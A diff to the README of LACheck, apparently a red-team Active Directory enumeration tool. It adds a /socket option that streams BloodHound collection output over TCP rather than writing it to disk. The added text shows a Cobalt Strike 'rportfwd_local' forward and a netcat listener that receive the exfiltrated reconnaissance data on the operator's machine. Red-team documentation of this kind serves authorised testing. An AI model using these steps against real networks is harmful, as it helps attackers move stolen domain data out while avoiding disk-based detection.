@@ -26,6 +26,8 @@ Arguments:
     /logons     - return logged on users on a host (requires smb, rpc, or winrm)
     /registry   - enumerate sessions from registry hive (requires smb)
     /services   - return services running as users (requires smb, rpc, or winrm)
+    /socket     - send bloodhound output to TCP socket instead of writing to disk
+                  ex: ""127.0.0.1:8080""
     /targets    - comma-separated list of hostnames to check
     /threads    - specify maximum number of parallel threads (default=25)
     /user       - specify username that collection was run under (useful during token manipulation)
@@ -108,6 +110,20 @@ The `/bloodhound` switch will write a randomly-named encrypted zip file to disk 
 
 ### /user
 BloodHound requires resolving users and computers to SIDs. Due to impersonation techniques such as Cobalt Strike's `make_token` and `kerberos_ticket_use`, LACheck may not be able to accurately determine the user context for a collection. The `/user` arguement is required to supply LACheck with the userprincipalname (format = `samaccountname@domain.tld`) of the context it is ran under in order to accurately correlate the collection information.
+
+### /socket
+BloodHound output can be sent to a TCP socket instead of being written to disk.
+
+If the TCP connection fails, BloodHound output will be written to disk.
+
+In a Cobalt Strike beacon, TCP connections can be forwarded from a host back to the operator's local machine using `rportfwd_local`:
+```
+rportfwd_local 8888 127.0.0.1 8888
+```
+An operator may then pipe the output of the TCP stream to a local file using netcat:
+```
+nc -lvnp 8888 > computers.json 
+```
 
 # Enumeration Methods
 ## Performance Summary
